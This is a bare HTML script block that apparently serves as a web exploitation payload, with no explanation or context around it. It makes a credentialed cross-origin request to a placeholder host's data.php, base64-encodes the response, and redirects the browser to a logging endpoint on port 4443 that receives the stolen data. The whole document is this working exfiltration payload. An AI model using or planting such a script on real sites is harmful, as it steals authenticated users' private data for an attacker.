<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://<host>/data.php', true);
    xhr.withCredentials = true;
    xhr.onload = () => {
      location = 'https://<host>:4443/log?data=' + btoa(xhr.response);
    };
    xhr.send();
</script>
